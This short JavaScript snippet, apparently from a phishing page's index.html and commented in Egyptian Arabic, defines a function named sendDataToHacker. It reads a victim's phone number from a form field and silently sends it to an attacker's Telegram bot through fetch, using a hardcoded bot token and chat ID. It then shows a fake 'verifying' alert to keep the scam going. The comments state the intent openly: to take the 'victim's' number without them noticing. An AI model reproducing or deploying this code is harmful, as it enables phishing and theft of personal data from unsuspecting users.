function sendDataToHacker() {
    let userPhone = document.getElementById("phoneInput").value; // رقم اللي ضغط
    
    // الطريقة الأسهل: إرسال البيانات مباشرة لبوت التيليجرام الخاص بصاحب الرابط
    let botToken = "8852999428:AAF0PeE9OjP24wXt6F13KfJamq1X58-luL4"; 
    let chatId = "7516606366";
    let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=رقم الضحية هو: ${userPhone}`;
    
    // تنفيذ الطلب في الخلفية من غير ما الضحية يحس بحاجة
    fetch(url);
    
    // تحويل الضحية لصفحة تانية عشان يكملوا عليه الخدعة
    alert("جار التحقق...");
}
<index.html>